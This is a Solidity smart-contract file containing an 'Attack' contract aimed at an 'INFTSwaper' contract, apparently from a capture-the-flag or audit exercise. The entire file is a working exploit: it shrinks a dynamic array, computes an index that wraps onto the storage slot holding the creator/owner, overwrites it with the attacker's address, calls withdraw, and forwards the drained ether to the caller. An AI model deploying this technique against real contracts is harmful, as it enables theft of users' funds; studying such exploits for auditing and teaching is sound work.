//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface INFTSwaper {
    function _removeLastCreater() external;

    function _changeCreater(uint256 _index, address _data) external;

    function withdraw() external;
}

contract Attack {
    INFTSwaper public swapper;

    constructor(address _address) {
        swapper = INFTSwaper(_address);
    }

    receive() external payable {}

    function attack() external {
        // remove first
        swapper._removeLastCreater();

        // set
        uint256 index = type(uint256).max -
            uint256(keccak256(abi.encodePacked(uint256(1)))) +
            1;

        swapper._changeCreater(index, (address(this)));

        // withdraw
        swapper.withdraw();

        // transfer to user
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }
}
